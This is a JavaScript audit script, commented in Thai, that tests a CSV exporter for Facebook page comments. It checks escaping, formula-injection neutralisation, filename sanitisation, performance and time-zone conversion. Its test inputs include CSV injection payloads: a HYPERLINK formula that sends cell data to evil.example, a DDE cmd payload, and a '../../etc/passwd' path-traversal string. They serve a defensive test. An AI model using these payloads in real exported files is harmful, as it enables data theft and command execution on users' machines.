/**
 * Audit ตัวส่งออก CSV
 *
 * ไฟล์ที่ออกไปเต็มไปด้วย**ข้อความที่คนแปลกหน้าพิมพ์เข้ามา** — คอมเมนต์ใน
 * เพจ Facebook ใครก็พิมพ์ได้ audit นี้จึงจำลอง "คอมเมนต์ที่ตั้งใจมาป่วน"
 * แล้วดูว่าไฟล์ที่ได้ยังถูกต้องและปลอดภัยไหม
 *
 *   pnpm build && node packages/listening/audit-export.mjs
 */
import { commentsToCsv, csvCell, exportFileName, toCsv, UTF8_BOM } from "./dist/index.js";

let fail = 0;
const say = (ok, label, detail = "") => {
  if (!ok) fail++;
  console.log(`${ok ? "✓" : "✗"} ${label}${detail ? "  " + detail : ""}`);
};

/**
 * ตัวอ่าน CSV แบบง่ายตาม RFC 4180 — เขียนแยกจากตัวเขียนโดยตั้งใจ
 * ถ้าใช้ตรรกะเดียวกันทั้งเขียนและอ่าน บั๊กที่สมมาตรกันจะมองไม่เห็นเลย
 */
function parseCsv(text) {
  const body = text.startsWith(UTF8_BOM) ? text.slice(1) : text;
  const rows = [];
  let row = [];
  let cell = "";
  let inQuotes = false;
  for (let i = 0; i < body.length; i++) {
    const ch = body[i];
    if (inQuotes) {
      if (ch === '"') {
        if (body[i + 1] === '"') { cell += '"'; i++; }
        else inQuotes = false;
      } else cell += ch;
    } else if (ch === '"') inQuotes = true;
    else if (ch === ",") { row.push(cell); cell = ""; }
    else if (ch === "\r" && body[i + 1] === "\n") { row.push(cell); rows.push(row); row = []; cell = ""; i++; }
    else cell += ch;
  }
  if (cell !== "" || row.length > 0) { row.push(cell); rows.push(row); }
  return rows;
}

// ── คอมเมนต์ที่ตั้งใจมาป่วน ────────────────────────────────────────────────
const NASTY = [
  { label: "จุลภาค", text: "สั่ง 2 ชิ้นค่ะ, ส่งพรุ่งนี้ได้ไหม" },
  { label: "เครื่องหมายคำพูด", text: 'เขาบอกว่า "ของแท้" จริงไหมคะ' },
  { label: "ขึ้นบรรทัดใหม่", text: "บรรทัดแรก\nบรรทัดสอง\nบรรทัดสาม" },
  { label: "CRLF กลางข้อความ", text: "ก่อน\r\nหลัง" },
  { label: "คำพูดซ้อนคำพูด", text: '"""' },
  { label: "จุลภาคติดคำพูดติดบรรทัด", text: 'a,"b"\nc' },
  { label: "อีโมจิ + ไทย", text: "อร่อยมาก❤️🔥 ขอบคุณค่ะ" },
  { label: "ช่องว่างล้วน", text: "   " },
  { label: "ข้อความยาว 10,000 ตัว", text: "ก".repeat(10_000) },
  { label: "แท็บ", text: "ราคา\t199\tบาท" },
];

const rows = NASTY.map((n, i) => ({
  createdAtMs: Date.UTC(2026, 7, 10, 3, i),
  pageName: "ร้านข้าวกล่อง, สาขา 2",
  authorName: n.label,
  message: n.text,
  postPermalink: "https://facebook.com/1",
}));

const csv = commentsToCsv({ comments: rows, timeZone: "Asia/Bangkok" });
const parsed = parseCsv(csv);

say(csv.charCodeAt(0) === 0xfeff, "มี BOM นำหน้า");
say(parsed.length === NASTY.length + 1, "จำนวนแถวถูกต้อง (หัว + ข้อมูล)", `ได้ ${parsed.length} ควรได้ ${NASTY.length + 1}`);
say(parsed.every((r) => r.length === 5), "ทุกแถวมี 5 คอลัมน์", `แถวที่เพี้ยน: ${parsed.filter((r) => r.length !== 5).length}`);

for (const [i, n] of NASTY.entries()) {
  const got = parsed[i + 1]?.[3];
  // ข้อความที่ขึ้นต้นด้วยอักขระสูตรจะถูกเติม ' นำหน้าโดยตั้งใจ (ดูข้อถัดไป)
  const same = got === n.text || got === `'${n.text}`;
  say(same, `อ่านกลับมาได้เหมือนเดิม: ${n.label}`, same ? "" : `ได้ ${JSON.stringify(got)?.slice(0, 60)}`);
}

// ── ช่องโหว่ที่ CSV เจอบ่อยที่สุด: Excel รันสูตรจากข้อความที่คนอื่นพิมพ์ ──
console.log("\n=== สูตรที่แฝงมาในคอมเมนต์ ===");
const FORMULAS = [
  '=HYPERLINK("http://evil.example?d="&A1,"คลิกรับส่วนลด")',
  "=1+1",
  '+HYPERLINK("http://evil.example")',
  "-2+3",
  "@SUM(A1:A9)",
  "=cmd|'/c calc'!A0",
  "\t=1+1",
  "\r=1+1",
];
for (const f of FORMULAS) {
  const one = commentsToCsv({
    comments: [{ createdAtMs: Date.UTC(2026, 7, 10), pageName: "p", authorName: "x", message: f, postPermalink: null }],
    timeZone: "Asia/Bangkok",
  });
  const cell = parseCsv(one)[1]?.[3] ?? "";
  say(!/^[=+\-@\t\r]/.test(cell), `Excel ไม่รันสูตร: ${JSON.stringify(f).slice(0, 40)}`, `ช่องเริ่มด้วย ${JSON.stringify(cell.slice(0, 3))}`);
}

// เนื้อหาต้องยังอ่านออก ไม่ใช่ถูกลบทิ้ง
const kept = parseCsv(
  commentsToCsv({
    comments: [{ createdAtMs: 0, pageName: "p", authorName: "x", message: "=1+1", postPermalink: null }],
    timeZone: "UTC",
  }),
)[1]?.[3];
say(kept?.includes("=1+1") === true, "ยังเห็นข้อความเดิมครบ ไม่ได้ตัดทิ้ง", `ได้ ${JSON.stringify(kept)}`);

// ข้อความปกติต้องไม่ถูกแตะ
const plain = parseCsv(
  commentsToCsv({
    comments: [{ createdAtMs: 0, pageName: "p", authorName: "x", message: "อร่อยมากค่ะ", postPermalink: null }],
    timeZone: "UTC",
  }),
)[1]?.[3];
say(plain === "อร่อยมากค่ะ", "ข้อความปกติไม่ถูกเติมอะไรเข้าไป", `ได้ ${JSON.stringify(plain)}`);

// ── ชื่อไฟล์ ────────────────────────────────────────────────────────────
console.log("\n=== ชื่อไฟล์ ===");
const nameCases = [
  { keyword: 'ค่าส่ง/ราคา:*?"<>|', want: /^comments-ค่าส่งราคา-/ },
  { keyword: "  เว้น   วรรค  ", want: /^comments-เว้น-วรรค-/ },
  { keyword: "ก".repeat(100), want: /^comments-ก{40}-/ },
  { keyword: "", want: /^comments-2026-08-10\.csv$/ },
  { keyword: "../../etc/passwd", want: /^comments-\.\.\.\.etcpasswd-/ },
];
for (const c of nameCases) {
  const name = exportFileName({ prefix: "comments", atMs: Date.UTC(2026, 7, 10), keyword: c.keyword });
  say(c.want.test(name), `ชื่อไฟล์: ${JSON.stringify(c.keyword).slice(0, 30)}`, name);
  say(!/[\\/:*?"<>|]/.test(name), "  ไม่มีอักขระต้องห้ามหลงเหลือ", name);
}

// ── ขนาดใหญ่ ────────────────────────────────────────────────────────────
console.log("\n=== 50,000 แถว ===");
const big = Array.from({ length: 50_000 }, (_, i) => ({
  createdAtMs: Date.UTC(2026, 7, 10, 0, 0, i % 60),
  pageName: "เพจ",
  authorName: `คนที่ ${i}`,
  message: "อร่อยมากค่ะ, ขอบคุณ",
  postPermalink: null,
}));
const t0 = process.hrtime.bigint();
const bigCsv = commentsToCsv({ comments: big, timeZone: "Asia/Bangkok" });
const ms = Number(process.hrtime.bigint() - t0) / 1e6;
say(ms < 3000, "สร้างไฟล์ 50,000 แถวภายใน 3 วินาที", `ใช้จริง ${ms.toFixed(0)} ms · ${(bigCsv.length / 1e6).toFixed(1)} MB`);
say(bigCsv.split("\r\n").length === 50_001, "นับบรรทัดได้ครบ", `ได้ ${bigCsv.split("\r\n").length}`);

// ── ค่าว่าง ─────────────────────────────────────────────────────────────
console.log("\n=== ไม่มีข้อมูล ===");
const empty = commentsToCsv({ comments: [], timeZone: "Asia/Bangkok" });
say(parseCsv(empty).length === 1, "เหลือแค่หัวตาราง ไม่ใช่ไฟล์เปล่า");
say(empty.charCodeAt(0) === 0xfeff, "ยังมี BOM");
say(csvCell(null) === '""' && csvCell(undefined) === '""', "null/undefined กลายเป็นช่องว่าง ไม่ใช่คำว่า null");
say(toCsv({ headers: ["a"], rows: [], bom: false }) === '"a"', "ปิด BOM ได้ตอนเทียบข้อความในเทสต์");

// ── เขตเวลา ─────────────────────────────────────────────────────────────
console.log("\n=== เขตเวลา ===");
const atMs = Date.UTC(2026, 7, 10, 17, 30);
const bkk = parseCsv(commentsToCsv({ comments: [{ createdAtMs: atMs, pageName: "p", authorName: null, message: null, postPermalink: null }], timeZone: "Asia/Bangkok" }))[1]?.[0];
const utc = parseCsv(commentsToCsv({ comments: [{ createdAtMs: atMs, pageName: "p", authorName: null, message: null, postPermalink: null }], timeZone: "UTC" }))[1]?.[0];
say(bkk === "2026-08-11 00:30", "แปลงเป็นเวลาไทยถูก (ข้ามวันด้วย)", `ได้ ${bkk}`);
say(utc === "2026-08-10 17:30", "UTC ยังเป็น UTC", `ได้ ${utc}`);

console.log(fail === 0 ? "\nผ่านทั้งหมด" : `\nไม่ผ่าน ${fail} ข้อ`);
process.exit(fail === 0 ? 0 : 1);
